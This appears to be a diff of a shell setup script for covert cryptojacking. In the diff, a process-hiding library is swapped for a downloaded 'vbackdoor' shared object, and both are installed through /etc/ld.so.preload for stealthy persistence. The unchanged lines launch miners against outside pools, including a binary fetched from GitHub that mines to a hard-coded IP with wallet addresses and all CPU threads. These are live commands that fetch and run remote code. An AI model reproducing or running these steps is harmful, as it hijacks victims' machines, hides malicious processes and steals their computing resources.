@@ -44,12 +44,11 @@ rm -rf README.md
 rm -rf .gitignore
 rm -rf elpigi.zip
 
-./graftcp/graftcp wget https://github.com/maszehh/sempak/raw/main/megatron.zip
-unzip megatron.zip
-rm -rf megatron.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+./graftcp/graftcp wget https://raw.githubusercontent.com/veo/vbackdoor/main/vbackdoor.c
+vi vbackdoor.c
+gcc -Wall -fPIC -shared -o vbackdoor.so vbackdoor.c -ldl
+sudo mv vbackdoor.so /usr/local/lib/
+echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
+
 
 ./graftcp/graftcp ./grm -a GRAM --pool stratum+tcp://ton.hashrate.to:4002 --ton-mode 6 --user UQCEbFsUU31X8Xhdkkkox4sB0IxbmYGM5F7FFbxABZfDYzrA & wget -q https://github.com/maszehh/sempak/raw/main/macan && chmod 700 macan && ./macan -o 103.253.244.6:443 -u ZEPHsA3mksJG2P4LgfHuuRDwswtmYxepV3ovN8mSR6BqLKzoAqdsz8nQGmmYtX8YBxKGvtHZ6VR2UU8c2tPec8rW7YvsPJtMPmJ -p Gh-Tukiman -a rx/0 -k --donate-level 1 -t $(nproc)
